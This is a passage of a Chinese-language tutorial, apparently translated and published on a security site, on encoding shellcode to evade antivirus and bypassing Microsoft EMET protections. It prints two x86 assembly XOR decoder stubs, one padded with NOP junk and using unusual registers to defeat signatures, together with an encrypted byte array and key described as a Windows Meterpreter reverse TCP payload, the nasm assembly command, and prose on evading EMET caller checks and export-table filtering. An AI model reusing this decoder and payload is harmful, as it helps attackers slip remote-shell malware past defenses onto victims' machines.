+18.GetKey:&nbsp;
+19.CALL&nbsp;SetKey&nbsp;;&nbsp;Call&nbsp;the&nbsp;SetKey&nbsp;label
+20.Key:&nbsp;DB&nbsp;&lt;Key&gt;&nbsp;;&nbsp;Decipher&nbsp;key
+21.KeyEnd:&nbsp;EQU&nbsp;$-Key&nbsp;;&nbsp;Set&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;decipher&nbsp;key&nbsp;to&nbsp;KeyEnd&nbsp;label
+22.SetKey:
+23.POP&nbsp;EDI&nbsp;;&nbsp;Pop&nbsp;the&nbsp;address&nbsp;of&nbsp;decipher&nbsp;key&nbsp;to&nbsp;EDI&nbsp;register
+24.XOR&nbsp;EDX,EDX&nbsp;;&nbsp;Zero&nbsp;out&nbsp;the&nbsp;EDX&nbsp;register
+25.Decipher:&nbsp;
+26.MOV&nbsp;AL,[ESI]&nbsp;;&nbsp;Move&nbsp;1&nbsp;byte&nbsp;from&nbsp;shellcode&nbsp;to&nbsp;AL&nbsp;register
+27.MOV&nbsp;BL,[EDI]&nbsp;;&nbsp;Move&nbsp;1&nbsp;byte&nbsp;from&nbsp;decipher&nbsp;key&nbsp;to&nbsp;BL&nbsp;register
+28.XOR&nbsp;AL,BL&nbsp;;&nbsp;Make&nbsp;a&nbsp;logical&nbsp;XOR&nbsp;operation&nbsp;between&nbsp;AL&nbsp;^&nbsp;BL
+29.MOV&nbsp;[ESI],AL&nbsp;;&nbsp;Move&nbsp;back&nbsp;the&nbsp;deciphered&nbsp;shellcode&nbsp;byte&nbsp;to&nbsp;same&nbsp;index
+30.INC&nbsp;ESI&nbsp;;&nbsp;Increase&nbsp;the&nbsp;shellcode&nbsp;index
+31.INC&nbsp;EDI&nbsp;;&nbsp;Increase&nbsp;the&nbsp;key&nbsp;index
+32.INC&nbsp;ECX&nbsp;;&nbsp;Increase&nbsp;the&nbsp;shellcode&nbsp;index&nbsp;counter
+33.INC&nbsp;EDX&nbsp;;&nbsp;Increase&nbsp;the&nbsp;key&nbsp;index&nbsp;counter
+34.CMP&nbsp;ECX,&nbsp;End&nbsp;;&nbsp;Compare&nbsp;the&nbsp;shellcode&nbsp;index&nbsp;counter&nbsp;with&nbsp;shellcode&nbsp;size&nbsp;
+35.JE&nbsp;Fin&nbsp;;&nbsp;If&nbsp;index&nbsp;counter&nbsp;is&nbsp;equal&nbsp;to&nbsp;shellcode&nbsp;size,&nbsp;jump&nbsp;to&nbsp;Fin&nbsp;label
+36.CMP&nbsp;EDX,KeyEnd&nbsp;;&nbsp;Compare&nbsp;the&nbsp;key&nbsp;index&nbsp;counter&nbsp;with&nbsp;key&nbsp;size&nbsp;
+37.JE&nbsp;GetKey&nbsp;;&nbsp;If&nbsp;key&nbsp;index&nbsp;counter&nbsp;is&nbsp;equal&nbsp;to&nbsp;key&nbsp;size,&nbsp;jump&nbsp;to&nbsp;GetKey&nbsp;label&nbsp;for&nbsp;reseting&nbsp;the&nbsp;key
+38.JMP&nbsp;Decipher&nbsp;;&nbsp;Repeate&nbsp;all&nbsp;operations
+39.Fin:&nbsp;;&nbsp;In&nbsp;here&nbsp;deciphering&nbsp;operation&nbsp;is&nbsp;finished
+40.RET&nbsp;;&nbsp;Execute&nbsp;the&nbsp;shellcode
+41.GetShellcode:
+42.CALL&nbsp;Stub&nbsp;;&nbsp;Jump&nbsp;to&nbsp;Stub&nbsp;label&nbsp;and&nbsp;push&nbsp;the&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;stack
+43.Shellcode:&nbsp;DB&nbsp;&lt;Shellcode&gt;
+44.
+45.End:&nbsp;EQU&nbsp;$-Shellcode&nbsp;;&nbsp;Set&nbsp;the&nbsp;shellcode&nbsp;size&nbsp;to&nbsp;End&nbsp;label</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因为代码非常好理解，我将不浪费时间逐行解释它了，使用JMP/CALL技巧能在运行时得到shellcode和密钥的地址，然后在shellcode和密钥的每个字节之间执行一个逻辑XOR操作，每次解密密钥到末尾，它将重置密钥为它的起始地址，在完成解码操作后，将跳转到shellcode，使用更长的XOR密钥能提高shellcode的随机性，但是也提高了代码块的熵，因此要避免使用太长的解码密钥，使用基础的逻辑操作（如XOR，NOT，ADD，SUB，ROR，ROL）能有几百种方式编码shellcode，在每种编码器中有无穷可能的shellcode输出，AV产品在解码序列之前检测到任何shellcode的特征的概率很低，因为这种AV产品也开发了启发式引擎，它能够检测解密和代码块中的解码循环。当编写shellcode编码器时，几乎没有用于绕过用于检测解码循环的静态方法的有效方式。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不常见的寄存器的使用：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在x86架构中，所有的寄存器有一个特定的目的，例如ECX表示扩展计数寄存器，且它通常用于循环计数。当我们编写一个基础的循环条件时，编译器可能使用ECX寄存器作为循环计数器变量，在一个代码块中找到连续增长的ECX寄存器强烈暗示了一个循环，这个问题的解决方案非常简单，不使用ECX作为循环计数器，这只是一个例子，但是它对于所有的其它类型的代码片段（如函数epilogue/prologue等）也非常有效。大量的代码识别机制依赖寄存器的使用，使用不常见的寄存器编写汇编代码将减小被检测率。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">垃圾代码填充：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在代码块中可能有几百种方法识别解码器，且几乎每个AV产品使用不同的方式，但是最终他们都不得不将可能的解码器的代码块生成一个特征，在解码器代码中使用随机的NOP指令是绕过静态特征分析的一种非常好的方式，不一定要使用NOP指令，可以是任何维持原有功能的其他指令，目标是增加垃圾指令以便破环代码块的恶意的特征。另一个关于编写shellcode重要的事是大小，因此避免使用太大的垃圾混淆代码否则将增加整体大小。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">实现这种方法的代码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">1.;&nbsp;#==============================#
+2.;&nbsp;|ESI&nbsp;-&gt;&nbsp;Pointer&nbsp;to&nbsp;shellcode&nbsp;|
+3.;&nbsp;|EDI&nbsp;-&gt;&nbsp;Pointer&nbsp;to&nbsp;key&nbsp;|
+4.;&nbsp;|EAX&nbsp;-&gt;&nbsp;Shellcode&nbsp;index&nbsp;counter|
+5.;&nbsp;|EDX&nbsp;-&gt;&nbsp;Key&nbsp;index&nbsp;counter&nbsp;|
+6.;&nbsp;|CL&nbsp;-&gt;&nbsp;Shellcode&nbsp;byte&nbsp;holder&nbsp;|
+7.;&nbsp;|BL&nbsp;-&gt;&nbsp;Key&nbsp;byte&nbsp;holder&nbsp;|
+8.;&nbsp;#==============================#
+9.;
+10.
+11.[BITS&nbsp;32]
+12.[ORG&nbsp;0]
+13.
+14.JMP&nbsp;GetShellcode&nbsp;;&nbsp;Jump&nbsp;to&nbsp;shellcode&nbsp;label
+15.Stub:&nbsp;
+16.POP&nbsp;ESI&nbsp;;&nbsp;Pop&nbsp;out&nbsp;the&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;ESI&nbsp;register&nbsp;
+17.PUSH&nbsp;ESI&nbsp;;&nbsp;Save&nbsp;the&nbsp;shellcode&nbsp;address&nbsp;to&nbsp;stack&nbsp;
+18.XOR&nbsp;EAX,EAX&nbsp;;&nbsp;Zero&nbsp;out&nbsp;the&nbsp;EAX&nbsp;register
+19.GetKey:&nbsp;
+20.CALL&nbsp;SetKey&nbsp;;&nbsp;Call&nbsp;the&nbsp;SetKey&nbsp;label
+21.Key:&nbsp;DB&nbsp;0x78,&nbsp;0x9b,&nbsp;0xc5,&nbsp;0xb9,&nbsp;0x7f,&nbsp;0x77,&nbsp;0x39,&nbsp;0x5c,&nbsp;0x4f,&nbsp;0xa6&nbsp;;&nbsp;Decipher&nbsp;key
+22.KeyEnd:&nbsp;EQU&nbsp;$-Key&nbsp;;&nbsp;Set&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;decipher&nbsp;key&nbsp;to&nbsp;KeyEnd&nbsp;label
+23.SetKey:
+24.POP&nbsp;EDI&nbsp;;&nbsp;Pop&nbsp;the&nbsp;address&nbsp;of&nbsp;decipher&nbsp;key&nbsp;to&nbsp;EDI&nbsp;register
+25.NOP&nbsp;;&nbsp;[GARBAGE]
+26.XOR&nbsp;EDX,EDX&nbsp;;&nbsp;Zero&nbsp;out&nbsp;the&nbsp;EDX&nbsp;register
+27.NOP&nbsp;;&nbsp;[GARBAGE]
+28.Decipher:&nbsp;
+29.NOP&nbsp;;&nbsp;[GARBAGE]
+30.MOV&nbsp;CL,[ESI]&nbsp;;&nbsp;Move&nbsp;1&nbsp;byte&nbsp;from&nbsp;shellcode&nbsp;to&nbsp;CL&nbsp;register
+31.NOP&nbsp;;&nbsp;[GARBAGE]
+32.NOP&nbsp;;&nbsp;[GARBAGE]
+33.MOV&nbsp;BL,[EDI]&nbsp;;&nbsp;Move&nbsp;1&nbsp;byte&nbsp;from&nbsp;decipher&nbsp;key&nbsp;to&nbsp;BL&nbsp;register
+34.NOP&nbsp;;&nbsp;[GARBAGE]
+35.XOR&nbsp;CL,BL&nbsp;;&nbsp;Make&nbsp;a&nbsp;logical&nbsp;XOR&nbsp;operation&nbsp;between&nbsp;CL&nbsp;^&nbsp;BL
+36.NOP&nbsp;;&nbsp;[GARBAGE]
+37.NOP&nbsp;;&nbsp;[GARBAGE]
+38.MOV&nbsp;[ESI],CL&nbsp;;&nbsp;Move&nbsp;back&nbsp;the&nbsp;deciphered&nbsp;shellcode&nbsp;byte&nbsp;to&nbsp;same&nbsp;index
+39.NOP&nbsp;;&nbsp;[GARBAGE]
+40.NOP&nbsp;;&nbsp;[GARBAGE]
+41.INC&nbsp;ESI&nbsp;;&nbsp;Increase&nbsp;the&nbsp;shellcode&nbsp;index
+42.INC&nbsp;EDI&nbsp;;&nbsp;Increase&nbsp;the&nbsp;key&nbsp;index
+43.INC&nbsp;EAX&nbsp;;&nbsp;Increase&nbsp;the&nbsp;shellcode&nbsp;index&nbsp;counter
+44.INC&nbsp;EDX&nbsp;;&nbsp;Increase&nbsp;the&nbsp;key&nbsp;index&nbsp;counter
+45.CMP&nbsp;EAX,&nbsp;End&nbsp;;&nbsp;Compare&nbsp;the&nbsp;shellcode&nbsp;index&nbsp;counter&nbsp;with&nbsp;shellcode&nbsp;size&nbsp;
+46.JE&nbsp;Fin&nbsp;;&nbsp;If&nbsp;index&nbsp;counter&nbsp;is&nbsp;equal&nbsp;to&nbsp;shellcode&nbsp;size,&nbsp;jump&nbsp;to&nbsp;Fin&nbsp;label
+47.CMP&nbsp;EDX,KeyEnd&nbsp;;&nbsp;Compare&nbsp;the&nbsp;key&nbsp;index&nbsp;counter&nbsp;with&nbsp;key&nbsp;size&nbsp;
+48.JE&nbsp;GetKey&nbsp;;&nbsp;If&nbsp;key&nbsp;index&nbsp;counter&nbsp;is&nbsp;equal&nbsp;to&nbsp;key&nbsp;size,&nbsp;jump&nbsp;to&nbsp;GetKey&nbsp;label&nbsp;for&nbsp;reseting&nbsp;the&nbsp;key
+49.JMP&nbsp;Decipher&nbsp;;&nbsp;Repeate&nbsp;all&nbsp;operations
+50.Fin:&nbsp;;&nbsp;In&nbsp;here&nbsp;deciphering&nbsp;operation&nbsp;is&nbsp;finished
+51.RET&nbsp;;&nbsp;Execute&nbsp;the&nbsp;shellcode
+52.GetShellcode:
+53.CALL&nbsp;Stub&nbsp;;&nbsp;Jump&nbsp;to&nbsp;Stub&nbsp;label&nbsp;and&nbsp;push&nbsp;the&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;stack
+54.Shellcode:&nbsp;DB&nbsp;0x84,&nbsp;0x73,&nbsp;0x47,&nbsp;0xb9,&nbsp;0x7f,&nbsp;0x77,&nbsp;0x59,&nbsp;0xd5,&nbsp;0xaa,&nbsp;0x97,&nbsp;0xb8,&nbsp;0xff,
+55.0x4e,&nbsp;0xe9,&nbsp;0x4f,&nbsp;0xfc,&nbsp;0x6b,&nbsp;0x50,&nbsp;0xc4,&nbsp;0xf4,&nbsp;0x6c,&nbsp;0x10,&nbsp;0xb7,&nbsp;0x91,
+56.0x70,&nbsp;0xc0,&nbsp;0x73,&nbsp;0x7a,&nbsp;0x7e,&nbsp;0x59,&nbsp;0xd4,&nbsp;0xa7,&nbsp;0xa4,&nbsp;0xc5,&nbsp;0x7d,&nbsp;0x5b,
+57.0x19,&nbsp;0x9d,&nbsp;0x80,&nbsp;0xab,&nbsp;0x79,&nbsp;0x5c,&nbsp;0x27,&nbsp;0x4b,&nbsp;0x2d,&nbsp;0x20,&nbsp;0xb2,&nbsp;0x0e,
+58.0x5f,&nbsp;0x2d,&nbsp;0x32,&nbsp;0xa7,&nbsp;0x4e,&nbsp;0xf5,&nbsp;0x6e,&nbsp;0x0f,&nbsp;0xda,&nbsp;0x14,&nbsp;0x4e,&nbsp;0x77,
+59.0x29,&nbsp;0x10,&nbsp;0x9c,&nbsp;0x99,&nbsp;0x7e,&nbsp;0xa4,&nbsp;0xb2,&nbsp;0x15,&nbsp;0x57,&nbsp;0x45,&nbsp;0x42,&nbsp;0xd2,
+60.0x4e,&nbsp;0x8d,&nbsp;0xf4,&nbsp;0x76,&nbsp;0xef,&nbsp;0x6d,&nbsp;0xb0,&nbsp;0x0a,&nbsp;0xb9,&nbsp;0x54,&nbsp;0xc8,&nbsp;0xb8,
+61.0xb8,&nbsp;0x4f,&nbsp;0xd9,&nbsp;0x29,&nbsp;0xb9,&nbsp;0xa5,&nbsp;0x05,&nbsp;0x63,&nbsp;0xfe,&nbsp;0xc4,&nbsp;0x5b,&nbsp;0x02,
+62.0xdd,&nbsp;0x04,&nbsp;0xc4,&nbsp;0xfe,&nbsp;0x5c,&nbsp;0x9a,&nbsp;0x16,&nbsp;0xdf,&nbsp;0xf4,&nbsp;0x7b,&nbsp;0x72,&nbsp;0xd7,
+63.0x17,&nbsp;0xba,&nbsp;0x79,&nbsp;0x48,&nbsp;0x4e,&nbsp;0xbd,&nbsp;0xf4,&nbsp;0x76,&nbsp;0xe9,&nbsp;0xd5,&nbsp;0x0b,&nbsp;0x82,
+64.0x5c,&nbsp;0xc0,&nbsp;0x9e,&nbsp;0xd8,&nbsp;0x26,&nbsp;0x2d,&nbsp;0x68,&nbsp;0xa3,&nbsp;0xaf,&nbsp;0xf9,&nbsp;0x27,&nbsp;0xc1,
+65.0x4e,&nbsp;0xab,&nbsp;0x94,&nbsp;0xfa,&nbsp;0x64,&nbsp;0x34,&nbsp;0x7c,&nbsp;0x94,&nbsp;0x78,&nbsp;0x9b,&nbsp;0xad,&nbsp;0xce,
+66.0x0c,&nbsp;0x45,&nbsp;0x66,&nbsp;0x08,&nbsp;0x27,&nbsp;0xea,&nbsp;0x0f,&nbsp;0xbd,&nbsp;0xc2,&nbsp;0x46,&nbsp;0xaa,&nbsp;0xcf,
+67.0xa9,&nbsp;0x5d,&nbsp;0x4f,&nbsp;0xa6,&nbsp;0x51,&nbsp;0x5f,&nbsp;0x91,&nbsp;0xe9,&nbsp;0x17,&nbsp;0x5e,&nbsp;0xb9,&nbsp;0x37,
+68.0x4f,&nbsp;0x59,&nbsp;0xad,&nbsp;0xf1,&nbsp;0xc0,&nbsp;0xd1,&nbsp;0xbf,&nbsp;0xdf,&nbsp;0x3b,&nbsp;0x47,&nbsp;0x27,&nbsp;0xa4,
+69.0x78,&nbsp;0x8a,&nbsp;0x99,&nbsp;0x30,&nbsp;0x99,&nbsp;0x27,&nbsp;0x69,&nbsp;0x0c,&nbsp;0x1f,&nbsp;0xe6,&nbsp;0x28,&nbsp;0xdb,
+70.0x95,&nbsp;0xd1,&nbsp;0x95,&nbsp;0x78,&nbsp;0xe6,&nbsp;0xbc,&nbsp;0xb0,&nbsp;0x73,&nbsp;0xef,&nbsp;0xf1,&nbsp;0xd5,&nbsp;0xef,
+71.0x28,&nbsp;0x1f,&nbsp;0xa0,&nbsp;0xf9,&nbsp;0x3b,&nbsp;0xc7,&nbsp;0x87,&nbsp;0x4e,&nbsp;0x40,&nbsp;0x79,&nbsp;0x0b,&nbsp;0x7b,
+72.0xc6,&nbsp;0x12,&nbsp;0x47,&nbsp;0xd3,&nbsp;0x94,&nbsp;0xf3,&nbsp;0x35,&nbsp;0x0c,&nbsp;0xdd,&nbsp;0x21,&nbsp;0xc6,&nbsp;0x89,
+73.0x25,&nbsp;0xa6,&nbsp;0x12,&nbsp;0x9f,&nbsp;0x93,&nbsp;0xee,&nbsp;0x17,&nbsp;0x75,&nbsp;0xe0,&nbsp;0x94,&nbsp;0x10,&nbsp;0x59,
+74.0xad,&nbsp;0x10,&nbsp;0xf3,&nbsp;0xd3,&nbsp;0x3f,&nbsp;0x1f,&nbsp;0x39,&nbsp;0x4c,&nbsp;0x4f,&nbsp;0xa6,&nbsp;0x2e,&nbsp;0xf1,
+75.0xc5,&nbsp;0xd1,&nbsp;0x27,&nbsp;0xd3,&nbsp;0x6a,&nbsp;0xb9,&nbsp;0xb0,&nbsp;0x73,&nbsp;0xeb,&nbsp;0xc8,&nbsp;0xaf,&nbsp;0xb9,
+76.0x29,&nbsp;0x24,&nbsp;0x6e,&nbsp;0x34,&nbsp;0x4d,&nbsp;0x7f,&nbsp;0xb0,&nbsp;0xc4,&nbsp;0x3a,&nbsp;0x6c,&nbsp;0x7e,&nbsp;0xb4,
+77.0x10,&nbsp;0x9a,&nbsp;0x3a,&nbsp;0x48,&nbsp;0xbb
+78.
+79.
+80.End:&nbsp;EQU&nbsp;$-Shellcode&nbsp;;&nbsp;Set&nbsp;the&nbsp;shellcode&nbsp;size&nbsp;to&nbsp;End&nbsp;label</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">唯一的改变在于EAX和ECX寄存器，现在在shellcode中负责计数的寄存器是EAX，且在每个XOR和MOV指令之间插入一些NOP填充，通过这个教程使用的shellcode是Windows Meterpreter反向TCP，在使用一个10字节长的随机XOR密钥加密shellcode后，一起放置在解码器中，使用nasm –f bin Decoder.asm命令汇编解码器为二进制格式（不要忘了移除shellcode中的换行符，否则nasm不能汇编它）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面是编码前shellcode的AV扫描结果，</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t012f8feda6dd42a34f.png" title="t010b455b51920d6b01.png" alt="http://p8.qhimg.com/t010b455b51920d6b01.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如你所见，大量的AV扫描器识别了shellcode。下面是shellcode编码后的扫描结果。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x07 对抗利用缓解措施</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">绕过AV产品有很多中方法，但是对抗利用缓解措施导致形式变了，2009年微软宣称EMET，它是一个工具包，来帮助阻止在软件中的漏洞利用，它有下面几种机制：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">动态数据执行保护（DEP）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">结构化异常处理覆盖保护（SEHOP）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">NullPage分配</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">堆喷射保护</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">导出地址表地址过滤（EAF）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">强制ASLR</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">导出地址表地址过滤增强版（EAF+）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ROP缓解措施</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">加载库校验</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">内存保护校验</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">调用者校验</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">模拟执行流</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Stack pivot</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Attack Surface Reduction（ASR）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这些缓解措施中EAF，EAF+和调用者校验使我们最关心的。正如早前解释的，在metasploit框架中几乎所有的shellcode使用Stephen Fewer的HASH API，且因为Hash API使用了PEB/EAT解析技术，EMET能简单的检测到并阻止shellcode的执行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x08 绕过EMET</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在EMET中的调用者校验检查进程中的Windows API调用，它能阻止API函数中的RET和JMP指令，以便阻止使用ROP方式的所有的利用，在HASH API中，在找到需要的API函数地址后，使用JMP指令执行函数，不幸的是这将触发EMET调用者校验，为了绕过调用者校验，应该避免使用JMP和RET指令指向API函数，使用CALL代替JMP指令执行API函数，Hash API应该绕过调用者校验，但是当我们看到EAF/EAF+缓解机制时，它们根据调用的代码阻止访问导出地址表（EAT），并且它检查栈寄存器是否在允许的边界内，或者它尝试读MZ/PE头和KERNELBASE，对于阻止EAT解析技术这是非常有效的缓解措施，但是EAT不是唯一一个包含函数地址的结构，导入地址表（IAT）也保存程序使用的API函数的地址，如果应用程序也使用我们需要的函数，在IAT结构中获得函数地址是可能的，一个叫Joshua Pitts的安全研究员最近开发一种新的IAT解析的方法，它在IAT中找到LoadLibraryA和GetProcAddress的地址，在获得这些函数的地址，能从任何库中得到任何函数，他也为Stephen Fewer的Hash API写了一个称为fibo的工具，且使用他写的IAT解析代码代替，如果你想阅读这种方法的更多细节，参见这里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x09 参考</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><a href="https://msdn.microsoft.com/en-us/library/ms809762.aspx" _src="https://msdn.microsoft.com/en-us/library/ms809762.aspx">https://msdn.microsoft.com/en-us/library/ms809762.aspx</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://en.wikipedia.org/wiki/Process_Environment_Block" _src="https://en.wikipedia.org/wiki/Process_Environment_Block">https://en.wikipedia.org/wiki/Process_Environment_Block</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003" _src="https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003">https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://en.wikipedia.org/wiki/Portable_Executable" _src="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/Portable_Executable</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" _src="https://en.wikipedia.org/wiki/Address_space_layout_randomization">https://en.wikipedia.org/wiki/Address_space_layout_randomization</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" _src="https://en.wikipedia.org/wiki/X86_calling_conventions">https://en.wikipedia.org/wiki/X86_calling_conventions</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="http://www.vividmachines.com/shellcode/shellcode.html" _src="http://www.vividmachines.com/shellcode/shellcode.html">http://www.vividmachines.com/shellcode/shellcode.html</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://github.com/secretsquirrel/fido" _src="https://github.com/secretsquirrel/fido">https://github.com/secretsquirrel/fido</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" _src="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X" _src="https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X">https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059" _src="https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059">https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192);"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192);"></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; color: rgb(0, 112, 192);">传送门</span></p><hr style="white-space: normal;"/><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><a href="http://bobao.360.cn/learning/detail/3420.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, 